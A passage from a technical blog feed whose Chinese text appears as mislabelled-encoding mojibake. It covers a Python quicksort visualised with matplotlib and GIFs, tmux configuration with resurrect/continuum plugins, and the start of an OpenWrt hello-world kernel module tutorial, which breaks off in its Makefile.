<h2 id="é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>é¢å‘å¯¹è±¡ç¼–ç¨‹</h2><p>ä¸ºäº†æ–¹ä¾¿ä»£ç çš„é˜…è¯»å’Œç®¡ç†,æˆ‘å°†å¿«æ’ä»£ç å°è£…æˆ<code>QuickSort</code>ç±»,åŒæ—¶åŠ å…¥å˜é‡<code>swap_times</code>ç”¨äºè®°å½•æ€»çš„æ•°æ®äº¤æ¢æ¬¡æ•°ã€‚</p>
<pre><code class="py">class QuickSort(object):
    &#39;&#39;&#39;Quick sort algorithm&#39;&#39;&#39;
    def sort(self, data):
        self.swap_times = 0
        # set the largest element to the end
        # self.__swap(data, data.index(max(data)), len(data) - 1)
        self.__sort(data, 0, len(data) - 1)
        return self.swap_times

    def __swap(self, data, lo, hi):
        data[lo], data[hi] = data[hi], data[lo]
        self.swap_times += 1

    def __sort(self, data, lo, hi):
        if lo &gt;= hi:
            return
        key = self.__partition(data, lo, hi)
        self.__sort(data, lo, key - 1)
        self.__sort(data, key + 1, hi)

    def __partition(self, data, lo, hi):
        &#39;&#39;&#39;partition array&#39;&#39;&#39;
        i = lo
        j = hi
        v = data[lo] # slicing element
        while True:
            # find one element that larger than v scan from left to right(â†’)
            i += 1
            while data[i] &lt; v:
                # below judge can dropped if the end element is the largest
                if i == hi:
                    break
                i += 1

            # find one element that smaller than v scan from right to left(â†)
            while v &lt; data[j]:
                j -= 1

            if i &gt;= j:
                break
            self.__swap(data, i, j)
        self.__swap(data, lo, j)
        return j
</code></pre>
<h2 id="æ‰“å°æ•°æ®äº¤æ¢è®°å½•"><a href="#æ‰“å°æ•°æ®äº¤æ¢è®°å½•" class="headerlink" title="æ‰“å°æ•°æ®äº¤æ¢è®°å½•"></a>æ‰“å°æ•°æ®äº¤æ¢è®°å½•</h2><p>ä¸ºäº†äº†è§£æ’åºè¿‡ç¨‹ä¸­æ•°æ®äº¤æ¢,å¯ä»¥åœ¨<code>__swap</code>å‡½æ•°ä¸­æ‰“å°æ¯ä¸€æ¬¡äº¤æ¢åçš„æ•°ç»„ã€‚</p>
<pre><code class="py">def __init__(self, debug=False, save_fig=False):
    self.debug = debug

def __swap(self, data, lo, hi):
    data[lo], data[hi] = data[hi], data[lo]
    self.swap_times += 1

    if self.debug:
        print(&#39;{0} swap({1}, {2})&#39;.format(data, lo, hi))
</code></pre>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="py">#main.py
def main():
    data = []
    random.seed(time.time())
    data = [_ for _ in range(20)]
    random.shuffle(data)

    qs = QuickSort(debug=True)
    swap_times, = qs.sort(data)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<pre><code class="sh">âœ  algorithm git:(master) âœ— ./main.py
[14, 3, 11, 10, 4, 1, 2, 12, 18, 17, 7, 8, 13, 15, 0, 9, 16, 6, 5, 19] swap(4, 19)
[14, 3, 11, 10, 4, 1, 2, 12, 5, 17, 7, 8, 13, 15, 0, 9, 16, 6, 18, 19] swap(8, 18)
[14, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 15, 0, 9, 16, 17, 18, 19] swap(9, 17)
[14, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 0, 15, 16, 17, 18, 19] swap(13, 15)
[0, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(0, 14)
[0, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(0, 0)
[0, 3, 2, 10, 4, 1, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(2, 6)
[0, 3, 2, 1, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(3, 5)
[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(1, 3)
[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(1, 1)
[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(4, 4)
[0, 1, 2, 3, 4, 10, 9, 12, 5, 6, 7, 8, 13, 11, 14, 15, 16, 17, 18, 19] swap(6, 13)
[0, 1, 2, 3, 4, 10, 9, 8, 5, 6, 7, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(7, 11)
[0, 1, 2, 3, 4, 7, 9, 8, 5, 6, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 10)
[0, 1, 2, 3, 4, 7, 6, 8, 5, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(6, 9)
[0, 1, 2, 3, 4, 7, 6, 5, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(7, 8)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 7)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 5)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(8, 8)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19] swap(12, 13)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(11, 12)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(15, 15)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(16, 16)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(17, 17)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(18, 18)
</code></pre>
<p>æ ¹æ®æ‰“å°ç»“æœå¯ä»¥é€æ­¥åˆ†æå¿«æ’ç®—æ³•çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œæ˜ç¡®çŸ¥æ™“æ¯ä¸€æ¬¡äº¤æ¢çš„æ•°æ®ã€‚</p>
<h2 id="æ•°æ®å¯è§†åŒ–"><a href="#æ•°æ®å¯è§†åŒ–" class="headerlink" title="æ•°æ®å¯è§†åŒ–"></a>æ•°æ®å¯è§†åŒ–</h2><p>æ‰“å°logå›ºç„¶å¯ä»¥åˆ†æç®—æ³•çš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯ä¸å¤Ÿç›´è§‚ï¼Œæ‰€ä»¥æƒ³ç€ç”¨å¯è§†åŒ–å·¥å…·è¿›ä¸€æ­¥å¤„ç†ï¼Œä»¥åŠ¨æ€å›¾ç‰‡å½¢å¼æ˜¾ç¤ºå¿«æ’è¿‡ç¨‹ã€‚ä¸ºæ­¤ï¼Œåªéœ€åœ¨äº¤æ¢æ•°æ®çš„å‡½æ•°<code>__swap</code>ä¸­ä½¿ç”¨<code>matplotlib</code>çš„æŸ±çŠ¶å›¾ç»˜åˆ¶äº¤æ¢å®Œæˆåçš„æ•°ç»„å³å¯ã€‚</p>
<pre><code class="python">import matplotlib.pyplot as plt
...

class QuickSort(object):
    def __init__(self, debug=False, save_fig=False):
        ...
        self.save_fig = save_fig
        self.fig, self.ax = plt.subplots()
        # open interactive mode of matplot
        plt.ion()

        if self.save_fig:
            self.path = &#39;./images/{0}&#39;.format(time.strftime(&#39;%Y%m%d_%H%M%S&#39;))
            os.makedirs(self.path)

    def __swap(self, data, lo, hi):
        ...
        self.__plot_figure(data, lo, hi, show_swap=True)

    def __plot_figure(self, data, lo=0, hi=0, show_swap=False):
        &#39;&#39;&#39;plot and save figure&#39;&#39;&#39;
        self.ax.clear()
        self.ax.set_title(&#39;data quicksort&#39;)
        self.ax.bar(range(len(data)), data, label=&#39;data&#39;)
        if show_swap:
            self.ax.bar([lo, hi], [data[lo], data[hi]], color=&#39;red&#39;, label=&#39;swap&#39;)
        plt.legend()
        plt.pause(0.001)

        if self.save_fig:
            plt.savefig(&#39;{0}/{1}.png&#39;.format(self.path, self.swap_times))
</code></pre>
<p>éœ€è¦æ³¨æ„çš„å‡ ç‚¹æ˜¯ï¼š</p>
<ol>
<li><code>matplotlib</code>å…·æœ‰ä¸¤ç§ç»˜å›¾æ¨¡å¼ï¼Œé˜»å¡(<code>block</code>)æ¨¡å¼å’Œäº¤äº’(<code>interactive</code>)æ¨¡å¼ï¼Œé˜»å¡æ¨¡å¼å¿…é¡»ç­‰å¾…å½“å‰ç»˜å›¾çª—å£å…³é—­æ–¹æ‰æ‰§è¡Œåç»­ç¨‹åºï¼Œè€Œäº¤äº’æ¨¡å¼åˆ™æ— éœ€ç­‰å¾…ã€‚ä¸ºäº†åŠ¨æ€æ˜¾ç¤ºæ’åºè¿‡ç¨‹ï¼Œè‡ªç„¶é€‰æ‹©äº¤äº’æ¨¡å¼ï¼Œæ‰€ä»¥åˆå§‹åŒ–æ—¶è°ƒç”¨<code>ion()</code>å‡½æ•°æ‰“å¼€äº¤äº’æ¨¡å¼</li>
<li>ç›¸æ¯”äºå…¶å®ƒæ ·å¼çš„å›¾è¡¨ï¼Œä½¿ç”¨æŸ±çŠ¶å›¾<code>bar</code>èƒ½å¤Ÿæ›´ç›´è§‚æ˜¾ç¤ºæ•°æ®å¤§å°åŠå˜åŒ–è¿‡ç¨‹</li>
<li>åœ¨æ¯æ¬¡é‡ç»˜å›¾è¡¨æ—¶ï¼Œéœ€è¦æ¸…ç©ºåŸæœ‰å›¾è¡¨</li>
<li>å¿…é¡»è°ƒç”¨<code>pause</code>å‡½æ•°äºˆä»¥ç­‰å¾…ï¼Œå¦åˆ™å¯èƒ½å‡ºç°æ— æ³•æ˜¾ç¤ºå›¾è¡¨çš„æƒ…å†µï¼Œç­‰å¾…æ—¶é•¿è‡ªå®š</li>
<li>ä¸ºäº†çªå‡ºæ˜¾ç¤ºæ¯æ¬¡äº¤æ¢çš„ä¸¤ä¸ªæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨çº¢è‰²å›¾è¡¨å•ç‹¬ç»˜åˆ¶äº¤æ¢æ•°æ®</li>
<li>ä½¿ç”¨<code>matplotlib</code>å‡½æ•°åº“ä¸­çš„<code>savefig</code>å¯ä»¥å°†å›¾è¡¨ä¸ºè‡³æœ¬åœ°å›¾ç‰‡æ–‡ä»¶ï¼Œä¸ºåç»­ç”Ÿæˆ<code>gif</code>å›¾ç‰‡åšå‡†å¤‡</li>
</ol>
<p><img src="/assets/algorithm/dataBar.png" alt="data bar"></p>
<h2 id="ç”ŸæˆGIFåŠ¨å›¾"><a href="#ç”ŸæˆGIFåŠ¨å›¾" class="headerlink" title="ç”ŸæˆGIFåŠ¨å›¾"></a>ç”ŸæˆGIFåŠ¨å›¾</h2><p>æœ‰äº†å‰é¢ä¿å­˜å¥½çš„å›¾ç‰‡ï¼Œä½¿ç”¨<code>imageio</code>åº“çš„<code>append</code>å‡½æ•°åŠ<code>mimsave</code>å³å¯ç”Ÿæˆ<code>gif</code>å›¾ç‰‡ã€‚å›¾ç‰‡é—´éš”æ—¶é—´ç”±<code>mimsave</code>å‡½æ•°çš„<code>duration</code>å‚æ•°å†³å®šã€‚</p>
<pre><code class="python"># main.py
import imageio
from quick_sort import QuickSort

import os
from os.path import join


def save_gif(path, gif_name):
    if not os.path.exists(path) or len(os.listdir(path))==0:
        return

    images = []
    for file_name in range(len(os.listdir(path))):
        file_path = join(path, &#39;{}.png&#39;.format(file_name))
        images.append(imageio.imread(file_path))
    imageio.mimsave(join(path, gif_name), images, &#39;GIF&#39;, duration=0.2)
</code></pre>
<p><img src="/assets/algorithm/quickSort.gif" alt="quick sort"></p>
<p>è‡³æ­¤ï¼Œä¾¿å®Œæˆäº†å¿«æ’çš„ç®—æ³•å®ç°åŠå…¶å¯è§†åŒ–ã€‚</p>
<h2 id="å®Œæ•´æºç "><a href="#å®Œæ•´æºç " class="headerlink" title="å®Œæ•´æºç "></a>å®Œæ•´æºç </h2><p>ä»£ç å·²ä¸Šä¼ è‡³<a href="https://github.com/Litreily/Python-demos.git" target="_blank" rel="noopener">github Python-demos</a> <code>algorithm</code>ç›®å½•</p>
<ul>
<li>quick_sort.py</li>
</ul>
<pre><code class="python">#!/usr/bin/env python
# -*- coding: utf-8 -*-

import matplotlib.pyplot as plt
import time
import os

class QuickSort(object):
    &#39;&#39;&#39;Quick sort algorithm&#39;&#39;&#39;
    def __init__(self, debug=False, save_fig=False):
        self.debug = debug
        self.save_fig = save_fig
        self.fig, self.ax = plt.subplots()
        plt.ion()

        if self.save_fig:
            self.path = &#39;./images/{0}&#39;.format(time.strftime(&#39;%Y%m%d_%H%M%S&#39;))
            os.makedirs(self.path)

    def sort(self, data):
        self.swap_times = 0
        self.__plot_figure(data)
        # set the largest element to the end
        # self.__swap(data, data.index(max(data)), len(data) - 1)
        self.__sort(data, 0, len(data) - 1)
        return self.swap_times, self.path

    def __swap(self, data, lo, hi):
        data[lo], data[hi] = data[hi], data[lo]
        self.swap_times += 1

        if self.debug:
            print(&#39;\t{0} swap({1}, {2})&#39;.format(data, lo, hi))

        self.__plot_figure(data, lo, hi, show_swap=True)

    def __plot_figure(self, data, lo=0, hi=0, show_swap=False):
        &#39;&#39;&#39;plot and save figure&#39;&#39;&#39;
        self.ax.clear()
        self.ax.set_title(&#39;data quicksort&#39;)
        self.ax.bar(range(len(data)), data, label=&#39;data&#39;)
        if show_swap:
            self.ax.bar([lo, hi], [data[lo], data[hi]], color=&#39;red&#39;, label=&#39;swap&#39;)
        plt.legend()
        plt.pause(0.001)

        if self.save_fig:
            plt.savefig(&#39;{0}/{1}.png&#39;.format(self.path, self.swap_times))

    def __sort(self, data, lo, hi):
        if lo &gt;= hi:
            return
        key = self.__partition(data, lo, hi)
        self.__sort(data, lo, key - 1)
        self.__sort(data, key + 1, hi)

    def __partition(self, data, lo, hi):
        &#39;&#39;&#39;partition array&#39;&#39;&#39;
        i = lo
        j = hi
        v = data[lo] # slicing element
        while True:
            # find one element that larger than v scan from left to right(â†’)
            i += 1
            while data[i] &lt; v:
                # below judge can dropped if the end element is the largest
                if i == hi:
                    break
                i += 1

            # find one element that smaller than v scan from right to left(â†)
            while v &lt; data[j]:
                j -= 1

            if i &gt;= j:
                break
            self.__swap(data, i, j)
        self.__swap(data, lo, j)
        return j

</code></pre>
<ul>
<li>main.py</li>
</ul>
<pre><code class="python">#!/bin/env python
# -*- encoding: utf-8 -*-

import time
import random
import imageio
from quick_sort import QuickSort

import os
from os.path import join


def save_gif(path, gif_name):
    if not os.path.exists(path) or len(os.listdir(path))==0:
        return

    images = []
    for file_name in range(len(os.listdir(path))):
        file_path = join(path, &#39;{}.png&#39;.format(file_name))
        images.append(imageio.imread(file_path))
    imageio.mimsave(join(path, gif_name), images, &#39;GIF&#39;, duration=0.2)


def main():
    data = []
    random.seed(time.time())
    random.shuffle(data)

    print(&#39;source: {0}&#39;.format(data))
    start = time.time()
    qs = QuickSort(debug=False, save_fig=True)
    swap_times, fig_path = qs.sort(data)
    save_gif(fig_path, &#39;quick_sort.gif&#39;)
    stop = time.time()
    print(&#39;result: {0}\n&#39;.format(data))

    print(&#39;----------------------------------&#39;)
    print(&#39;swap times: {0}&#39;.format(swap_times))
    print(&#39;spend time: {0}s&#39;.format(stop - start))
    print(&#39;image path: {0}&#39;.format(fig_path))
    print(&#39;----------------------------------&#39;)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sort </tag>
            
            <tag> visualization </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tmuxå¸¸ç”¨é…ç½®è¯´æ˜]]></title>
      <url>https://www.litreily.top/2018/06/19/tmux-config/</url>
      <content type="html"><![CDATA[<p><code>tmux</code>ä½œä¸º<code>Linux</code>ä¸‰å¤§ç¥å™¨ä¹‹ä¸€ï¼Œç»“åˆ<code>zsh</code>å’Œ<code>vim</code>å ªç§°æ— æ•Œï¼Œ<code>tmux</code>ä½œä¸ºåˆ†å±åˆ©å™¨è‡ªæœ‰å…¶å¼ºå¤§ä¹‹å¤„ï¼Œæœ¬æ–‡å°±å…¶å¸¸ç”¨é…ç½®äºˆä»¥è¯´æ˜ã€‚</p>
<h2 id="å®‰è£…tmux"><a href="#å®‰è£…tmux" class="headerlink" title="å®‰è£…tmux"></a>å®‰è£…tmux</h2><pre><code class="zsh"># install in ubuntu
$ sudo apt-get install tmux
</code></pre>
<ul>
<li><code>Ctrl+B</code>: default keys of tmux <code>prefix</code></li>
<li><code>.tmux.conf</code>: config file of <code>tmux</code></li>
<li><code>tmux source-file .tmux.conf</code>: command to reload <code>.tmux.conf</code></li>
</ul>
<a id="more"></a>
<h2 id="ç¦æ­¢è‡ªåŠ¨æ›´æ–°çª—å£åç§°"><a href="#ç¦æ­¢è‡ªåŠ¨æ›´æ–°çª—å£åç§°" class="headerlink" title="ç¦æ­¢è‡ªåŠ¨æ›´æ–°çª—å£åç§°"></a>ç¦æ­¢è‡ªåŠ¨æ›´æ–°çª—å£åç§°</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>tmux</code>ä¼šæ ¹æ®å½“å‰ç›®å½•åŠç›¸å…³æ“ä½œè‡ªåŠ¨æ›´æ”¹çª—å£åç§°ï¼Œä½†é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯ä¸éœ€è¦å…¶ä¿®æ”¹çš„ï¼Œä¸ºæ­¤å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼š</p>
<pre><code class="yml">setw -g allow_rename &#39;off&#39;
</code></pre>
<h2 id="è®¾ç½®zshä½œä¸ºé»˜è®¤shell"><a href="#è®¾ç½®zshä½œä¸ºé»˜è®¤shell" class="headerlink" title="è®¾ç½®zshä½œä¸ºé»˜è®¤shell"></a>è®¾ç½®zshä½œä¸ºé»˜è®¤shell</h2><p>å¦‚æœå…ˆå®‰è£…çš„<code>tmux</code>, åå®‰è£…å’Œé…ç½®<code>zsh</code>ï¼Œé‚£tmuxæœ‰å¯èƒ½é»˜è®¤æ‰“å¼€ä½¿ç”¨çš„æ˜¯<code>bash</code>ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ä»¥ä¸‹é…ç½®æŒ‡ä»¤äºˆä»¥æ›´æ”¹ï¼š</p>
<pre><code class="yml">set-option -g default-shell /bin/zsh
</code></pre>
<h2 id="è®¾ç½®vimä½œä¸ºé»˜è®¤ç¼–è¾‘å™¨"><a href="#è®¾ç½®vimä½œä¸ºé»˜è®¤ç¼–è¾‘å™¨" class="headerlink" title="è®¾ç½®vimä½œä¸ºé»˜è®¤ç¼–è¾‘å™¨"></a>è®¾ç½®vimä½œä¸ºé»˜è®¤ç¼–è¾‘å™¨</h2><p>åœ¨<code>tmux</code>çš„æœç´¢æ¨¡å¼<code>prefix+[</code>ä¸‹ï¼Œé»˜è®¤ä½¿ç”¨â†‘â†“â†â†’ç®­å¤´ä½œä¸ºç§»åŠ¨æŒ‰é”®ï¼Œå¯¹äºä¹ æƒ¯äº<code>vim</code>æ“ä½œçš„æˆ‘æ¥è®²ï¼Œè¿™æ˜¾ç„¶å¾ˆä¸æ–¹ä¾¿ï¼Œè¿˜å¥½<code>tmux</code>æä¾›äº†ä½¿ç”¨<code>vim</code>ä½œä¸ºç¼–è¾‘å™¨çš„é€‰é¡¹ï¼Œå¯ç”¨é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">setw -g mode-keys vi
</code></pre>
<h2 id="è§£å†³é…è‰²é—®é¢˜"><a href="#è§£å†³é…è‰²é—®é¢˜" class="headerlink" title="è§£å†³é…è‰²é—®é¢˜"></a>è§£å†³é…è‰²é—®é¢˜</h2><p>åœ¨<code>tmux</code>ä¸­ï¼Œæœ‰å¯èƒ½éƒ¨åˆ†åº”ç”¨çš„é…è‰²ä¸çº¯<code>shell</code>ä¸‹ä¸ä¸€è‡´ï¼Œå°¤å…¶æ˜¯<code>vim</code>ï¼Œåæ¥å‘ç°<code>htop</code>ä¹Ÿå­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚è¦è§£å†³å¾ˆç®€å•ï¼Œåœ¨<code>tmux</code>é…ç½®ä¸­åŠ ä¸Šä¸€å¥ï¼š</p>
<pre><code class="yml">set -g default-terminal &quot;screen-256color&quot;
</code></pre>
<h2 id="å­˜å‚¨-æ¢å¤tmuxå·¥ä½œç¯å¢ƒ"><a href="#å­˜å‚¨-æ¢å¤tmuxå·¥ä½œç¯å¢ƒ" class="headerlink" title="å­˜å‚¨/æ¢å¤tmuxå·¥ä½œç¯å¢ƒ"></a>å­˜å‚¨/æ¢å¤tmuxå·¥ä½œç¯å¢ƒ</h2><p>å¦‚æœåœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨<code>tmux</code>ï¼Œç”±äºæœåŠ¡å™¨åŸºæœ¬ä¸å…³æœºï¼Œæ‰€ä»¥ä¸ç”¨è€ƒè™‘<code>tmux</code>ç¯å¢ƒä¼šä¸¢å¤±ã€‚ä½†æ˜¯åœ¨ä¸ªäººç”µè„‘ä¸Šä½¿ç”¨çš„è¯ï¼Œé‡å¯ç”µè„‘å<code>tmux</code>ç¯å¢ƒå°±ä¸¢å¤±äº†ï¼Œå¦‚æœæ¯æ¬¡é‡å¯éƒ½è¦é‡æ–°é…ç½®ä¸€éç¯å¢ƒçš„è¯ï¼Œé‚£æœªå…å¤ªæµªè´¹æ—¶é—´äº†ã€‚æ‰€ä»¥è¿™é‡Œæ¨èä¸ªæ’ä»¶<a href="https://github.com/tmux-plugins/tmux-resurrect" target="_blank" rel="noopener">tmux-resurrect</a></p>
<p><code>tmux-resurrect</code>å¯ä»¥å¯¹<code>tmux</code>ç¯å¢ƒè¿›è¡Œä¿å­˜å’Œæ¢å¤ï¼Œå®‰è£…åŠé…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="zsh">$ mkdir ~/.tmux
$ git clone https://github.com/tmux-plugins/tmux-resurrect ~/.tmux/tmux-resurrect

# edit .tmux.conf at the bottom
$ vi ~/.tmux.conf
run-shell ~/.tmux/tmux-resurrect/resurrect.tmux

# re source .tmux.conf
$ tmux source-file ~/.tmux.conf
</code></pre>
<p><code>tmux-resurrect</code>ç”¨æ³•:</p>
<ul>
<li><code>prefix + Ctrl-s</code> - save</li>
<li><code>prefix + Ctrl-r</code> - restore</li>
</ul>
<p>æ’ä»¶<code>tmux-resurrect</code>è¿˜å¯ä»¥ç»“åˆæ’ä»¶<code>tmux-continum</code>ä¸€èµ·ä½¿ç”¨ï¼Œ<code>tmux-continum</code>å¯ä»¥è‡ªåŠ¨å®šæ—¶å­˜å‚¨ç¯å¢ƒï¼Œåœ¨å¼€æœºåæ‰“å¼€<code>tmux</code>æ—¶è‡ªåŠ¨æ¢å¤ç¯å¢ƒï¼Œè¿™å°±é¿å…äº†äººä¸ºå­˜å‚¨å’Œæ¢å¤çš„éº»çƒ¦ä»¥åŠå› å¿˜è®°å­˜å‚¨å¯¼è‡´çš„ç¯å¢ƒä¸¢å¤±ã€‚<code>tmux-continum</code>çš„å®‰è£…åŠé…ç½®å¦‚ä¸‹:</p>
<pre><code class="zsh">$ git clone https://github.com/tmux-plugins/tmux-continuum ~/.tmux/tmux-continum

# edit .tmux.conf
$ vi ~/.tmux.conf
set -g @continuum-restore &#39;on&#39;  # restore last saved env
set -g @continuum-save-interval &#39;30&#39;  # default is 15 minutes
run-shell ~/.tmux/tmux-continum/continuum.tmux

$ tmux source ~/.tmux.conf
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼š</p>
<ol>
<li>ä»¥ä¸Šä¸¤ä¸ªæ’ä»¶éƒ½æ˜¯æ‰‹åŠ¨å®‰è£…çš„ï¼Œå…¶å®ä¹Ÿå¯ä»¥ä½¿ç”¨<code>tmux</code>çš„æ’ä»¶ç®¡ç†å™¨<a href="https://github.com/tmux-plugins/tpm" target="_blank" rel="noopener">tpm</a>è¿›è¡Œå®‰è£…ï¼Œè¿™é‡Œå°±ä¸è¯¦è¿°äº†ã€‚</li>
<li>ä»¥ä¸Šæ’ä»¶è¦æ±‚<code>tmux</code>ç‰ˆæœ¬å¤§ç­‰äº<code>1.9</code></li>
</ol>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://linuxtoy.org/archives/tmux-resurrect-and-continuum.html" target="_blank" rel="noopener">https://linuxtoy.org/archives/tmux-resurrect-and-continuum.html</a></li>
<li><a href="https://github.com/tmux/tmux" target="_blank" rel="noopener">https://github.com/tmux/tmux</a></li>
<li><a href="https://github.com/tmux-plugins/tpm" target="_blank" rel="noopener">https://github.com/tmux-plugins/tpm</a></li>
<li><a href="https://github.com/tmux-plugins/tmux-resurrect" target="_blank" rel="noopener">https://github.com/tmux-plugins/tmux-resurrect</a></li>
<li><a href="https://github.com/tmux-plugins/tmux-continuum" target="_blank" rel="noopener">https://github.com/tmux-plugins/tmux-continuum</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tmux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Openwrtä¸­æ·»åŠ å†…æ ¸æ¨¡å—]]></title>
      <url>https://www.litreily.top/2018/05/30/openwrt-ko/</url>
      <content type="html"><![CDATA[<p>å¦‚æœæƒ³è¦åœ¨<code>Openwrt</code>ç³»ç»Ÿä¸­æ·»åŠ ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼Œå…¶å®å¹¶ä¸éš¾ï¼Œå¯¹ç€æŸä¸ªå·²æœ‰çš„å†…æ ¸æ¨¡å—ï¼Œä¾è‘«èŠ¦ç”»ç“¢å˜›ï¼Œä¸éš¾ã€‚æœ¬æ–‡å°†ä»‹ç»ä¸€ä¸ªæœ€æœ€ç®€å•çš„</p>
<h2 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h2><p>path: <code>git_repo/package/kmod-demo/</code></p>
<p>ä¸‹é¢æ˜¯æºç åŒ…å«çš„æ‰€æœ‰æ–‡ä»¶ï¼Œæ ¹çº§<code>Makefile</code>æä¾›ç»™å†…æ ¸ç¼–è¯‘å™¨ä½¿ç”¨ï¼Œ<code>src</code>çº§<code>Makefile</code>ç”¨äºç¼–è¯‘<code>.ko</code>æ–‡ä»¶ã€‚</p>
<pre><code class="txt">$ tree
.
â”œâ”€â”€ Makefile
â””â”€â”€ src
    â”œâ”€â”€ demo.c
    â”œâ”€â”€ Kconfig
    â””â”€â”€ Makefile
</code></pre>
<h3 id="demo-c"><a href="#demo-c" class="headerlink" title="demo.c"></a>demo.c</h3><p>æºç éå¸¸ç®€å•ï¼Œåœ¨è£…è½½æ—¶æ‰“å°<code>Hello World</code>ï¼Œå¸è½½æ—¶æ‰“å°<code>Exit</code>ã€‚</p>
<pre><code class="c">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;

static int __init hello_init(void)
{
    printk(&quot;Hello World\n&quot;);
    return 0;
}

static void __exit hello_exit(void)
{
    printk(&quot;Exit\n&quot;);
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;Guangtao.wu&quot;);
</code></pre>
<h3 id="Kconfig"><a href="#Kconfig" class="headerlink" title="Kconfig"></a>Kconfig</h3><p>åœ¨<code>Kconfig</code>æ–‡ä»¶ä¸­æ·»åŠ ä¸€äº›ç¼–è¯‘ç›¸å…³çš„é€‰é¡¹</p>
<pre><code class="json">config DEMO
    tristate &quot;This is a Module_DEMO&quot;
    default n
    help
      This is a DEMO, for debugging kernel model.
      If unsure, say N.
</code></pre>
<ul>
<li><code>default</code> : è¯¥é€‰é¡¹çš„é»˜è®¤å€¼<ul>
<li><code>n</code> ä¸ç¼–è¯‘</li>
<li><code>y</code> ç¼–è¯‘åˆ°å†…æ ¸ï¼Œå¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½</li>
<li><code>m</code> ç¼–è¯‘ç”Ÿæˆ<code>.ko</code>æ¨¡å—ï¼Œä¸è‡ªåŠ¨åŠ è½½ï¼Œéœ€ä½¿ç”¨<code>insmod</code>åŠ è½½</li>
</ul>
</li>
</ul>
<h3 id="Root-Makefile"><a href="#Root-Makefile" class="headerlink" title="Root - Makefile"></a>Root - Makefile</h3><p>æ ¹çº§<code>Makefile</code>ä»¿å…¶å®ƒå†…æ ¸æ¨¡å—ç¼–å†™ï¼Œæ³¨æ„æ›¿æ¢åç§°<code>demo</code>ï¼Œ<code>SUBMENU</code>ä»¥åŠ<code>TITLE</code>å°†æ˜¾ç¤ºåœ¨<code>make menuconfig</code>çš„äº¤äº’ç•Œé¢ä¸­ã€‚</p>
<pre><code class="makefile">#
# Copyright (C) 2006 OpenWrt.org
#
# This is free software, licensed under the GNU General Public License v2.
# See /LICENSE for more information.
#
# $Id: Makefile 6565 2007-03-14 13:42:21Z nbd $

include $(TOPDIR)/rules.mk
include $(INCLUDE_DIR)/kernel.mk

